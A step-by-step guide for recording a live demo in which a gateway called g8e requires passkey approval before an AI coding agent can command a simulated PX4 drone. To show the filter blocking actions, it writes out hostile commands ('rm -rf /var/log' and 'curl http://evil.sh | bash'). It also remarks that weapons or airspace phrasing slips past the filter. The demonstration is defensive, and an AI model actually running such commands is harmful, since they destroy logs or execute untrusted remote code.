# Live Swarm Demo — Recording Walkthrough

> **What this is:** A step-by-step guide for recording a live demo of g8e governing an AI agent controlling a virtual drone. Every step is performed manually — no automation that isn't part of the production platform.

---

## Architecture

```
Claude Code (g8e registered via `claude mcp add g8e -- g8e mcp stdio`)
    ↓ MCP stdio
g8e mcp stdio  (mTLS-bound CLI session; auto-opens approval page; subscribes to SSE)
    ↓ mTLS → gateway /mcp
g8e Gateway, notary posture
    L1 compiled doctrine → L2 in-process Tribunal → L3 suspend + WebAuthn → L4 warden → L5 actuator
    ↓ native tool: run_shell_command
python3 drone_cmd.py set_altitude 50
    ↓ MAVSDK → udpin://0.0.0.0:14540
PX4 SITL (Gazebo gz_x500)  →  MAVLink telemetry  →  QGroundControl
```

---

## Terminal Layout (4 terminals during recording)

| # | Label | Command | Stays open? |
|---|-------|---------|------------|
| 1 | PX4 SITL | `cd ~/PX4-Autopilot && make px4_sitl gz_x500` | Yes — the virtual drone |
| 2 | QGroundControl | `~/QGroundControl.AppImage` | Yes — the visualizer |
| 3 | g8e Gateway | `g8e gw start -f --posture notary ...` | Yes — the enforcement engine |
| 4 | Claude Code | `claude` | Yes — the AI agent |

---

## Phase 1: One-Time Setup (do before recording)

### 1.1 Install QGroundControl

```bash
sudo usermod -a -G dialout $USER
sudo apt-get remove modemmanager -y
sudo apt update
sudo apt install gstreamer1.0-plugins-bad gstreamer1.0-libav gstreamer1.0-gl libqt5gui5 libfuse2 -y
wget https://github.com/mavlink/qgroundcontrol/releases/download/v4.3.0/QGroundControl.AppImage
chmod +x ./QGroundControl.AppImage
```

> **Reboot required** after this for the `dialout` group to take effect.

### 1.2 Install PX4 Simulator

```bash
git clone https://github.com/PX4/PX4-Autopilot.git --recursive ~/PX4-Autopilot
bash ~/PX4-Autopilot/Tools/setup/ubuntu.sh
```

> **Reboot again** after the setup script completes.

### 1.3 Build g8e + Python Environment

```bash
cd ~/g8e && make build
python3 -m venv ~/drone_env
source ~/drone_env/bin/activate
pip install mavsdk
```

### 1.4 Create Tribunal Bootstrap File

```bash
mkdir -p ~/live-demo
cat > ~/live-demo/tribunal-bootstrap.json << EOF
{
  "tribunal_id": "live-demo-tribunal",
  "member_app_ids": ["live-demo-ensemble"],
  "quorum": 1,
  "seed_hex": "$(openssl rand -hex 32)"
}
EOF
```

### 1.5 Verify drone_cmd.py

```bash
source ~/drone_env/bin/activate
python3 -m py_compile ~/drone_cmd.py
```

---

## Phase 2: Pre-Recording Setup (do 10 minutes before recording)

### 2.1 Start PX4 SITL — Terminal 1

```bash
cd ~/PX4-Autopilot
make px4_sitl gz_x500
```

> **Why not jMAVSim?** PX4 v1.18 removed the `jmavsim` make target — Gazebo (`gz sim`, installed by `ubuntu.sh`) is the supported simulator. The x500 is the standard quadcopter model.
>
> **Build gotcha:** if the build fails with `google/protobuf/runtime_version.h: No such file or directory`, a newer `protoc` (e.g. `/usr/local/bin/protoc` from g8e's proto tooling) is shadowing the system one. Fix: `rm -rf build/px4_sitl_default`, then build with `/usr/local/bin` dropped from PATH so CMake picks the system protoc matching `libprotobuf-dev`.

**Wait for:** A Gazebo window opens showing the x500 quadcopter on the ground. Terminal shows PX4 boot messages ending with a `pxh>` prompt, and MAVLink broadcasts on `udp://:14540`.

### 2.2 Start QGroundControl — Terminal 2

```bash
~/QGroundControl.AppImage
```

**Wait for:** QGC opens and auto-detects the local UDP stream. The 3D map centers over your virtual drone.

### 2.3 Start the Gateway — Terminal 3

```bash
g8e gw start -f --posture notary \
  --tribunal-id live-demo-tribunal \
  --tribunal-bootstrap ~/live-demo/tribunal-bootstrap.json
```

**Wait for:** Log lines confirming Tribunal is wired and the gateway is listening on HTTPS `:8443`.

### 2.4 Enroll CLI Credentials + Register Passkey — Terminal 4

```bash
g8e auth enroll
```

**What happens:**
1. Keypair generated locally
2. CSR submitted to gateway CA over HTTPS
3. Signed mTLS credentials saved to disk
4. Browser opens to passkey registration page
5. Complete the WebAuthn ceremony (tap your authenticator)

### 2.5 Register g8e with Claude Code — Terminal 4

```bash
g8e mcp agent show claude
claude mcp add g8e -- /home/bob/g8e/g8e mcp stdio
```

### 2.6 Launch Claude Code — Terminal 4

```bash
claude
```

> **Optional strict mode** (forces ALL actions through g8e):
> ```bash
> claude --strict-mcp-config --disallowed-tools "Bash,Read,Write,Edit,Glob,Grep,WebSearch,WebFetch"
> ```

---

## Phase 3: Record the Demo

All four terminals should be active. Verify the drone is visible in QGC before starting.

### Scene 1: Happy Path — Drone Takeoff with Human Approval

**1. Ask Claude:**

> "Take the drone off to 20 meters using drone_cmd.py."

**2. What happens:** Claude calls `run_shell_command` with `python3 ~/drone_cmd.py takeoff 20`. The gateway runs it through L1 (passes), L2 Tribunal (signs), then L3 — the warden rejects with `ErrL3ProofMissing` and **suspends the transaction**.

**3. What you see:** Your browser **auto-opens** to `https://localhost:8443/approve/<tx_hash>`. The drone has NOT moved.

**Narration:** *"The drone hasn't moved — g8e is demanding proof of human presence before it will execute."*

**4. Tap your passkey on camera.** The gateway verifies the WebAuthn assertion and **executes the suspended transaction immediately** — the drone takes off at that moment. The signed receipt renders in the browser.

**5.** Within ~10 seconds, Claude receives the executed result and reports success.

**6. Repeat once:** Ask Claude *"climb to 50 meters"* — same suspend → approve → execute flow.

### Scene 2: Audit Trail

**7. Show the signed receipts:**

```bash
g8e audit receipts
```

Also available: `g8e audit events` (raw event log) and `g8e audit summary` (aggregate stats).

**Narration:** *"Every action is cryptographically signed and auditable — here are the receipts for the two commands we just approved."*

### Scene 3: Blocked Path — Destructive Command Blocked at L1

**8. Ask Claude:**

> "Free up disk space — delete /var/log with rm -rf."

**What happens:** L1 doctrine matches `destroy_rm_rf_system_dirs` and blocks the command **instantly, fail-closed**. No approval is offered — the action is too dangerous to even suspend. The gateway log (Terminal 3) shows the MITRE ATT&CK classification.

**Narration:** *"Legitimate-but-state-changing drone commands are suspended for human approval, but destructive actions like wiping system directories are blocked instantly with a MITRE classification. No approval possible, no approval offered."*

> **Do NOT** script the blocked command around drone weapons or restricted airspace — those phrases pass L1. Use genuinely-blocked commands like `rm -rf /var/log` or `curl http://evil.sh | bash`.

### Scene 4 (Optional): CLI-Initiated Approval

Instead of waiting for the browser to auto-open, you can drive approval from the terminal:

```bash
g8e auth approve <tx_hash>
```

This opens the same browser page and subscribes to the SSE stream for `approval.completed`. Good to show once as *"the operator can also drive this from the terminal."*

---

## Timing & Pacing

| Fact | Value | Impact |
|------|-------|--------|
| Approval TTL | **2 minutes** | Don't linger narrating while a suspension is pending — it expires and the agent must re-issue |
| SSE notification | **Near-instant** | The `approval.completed` event fires as soon as the passkey ceremony completes — Claude proceeds immediately |
| Every `tools/call` is a mutation | **Yes** | Even a read-only `drone_cmd.py status` requires a passkey tap in notary posture. Keep to 2–3 tool calls |
| CLI credentials | **Required** | mTLS credentials are needed for SSE subscription; without them the L3 approval flow returns an error |

---

## Pre-Recording Checklist

- [ ] PX4 SITL running and drone visible in QGC
- [ ] Gateway started in notary posture with tribunal bootstrap
- [ ] CLI credentials enrolled and passkey registered
- [ ] g8e registered with Claude Code via `claude mcp add`
- [ ] `drone_cmd.py` syntax verified
- [ ] Tribunal bootstrap file exists at `~/live-demo/tribunal-bootstrap.json`
- [ ] Test one `run_shell_command` call end-to-end (suspend → approve → execute)
- [ ] Confirm browser auto-open works (else stderr fallback prints the URL — narrate it)
- [ ] Confirm `rm -rf /var/log` is blocked by L1
- [ ] Time a full approval cycle; keep narration inside the 2-minute TTL
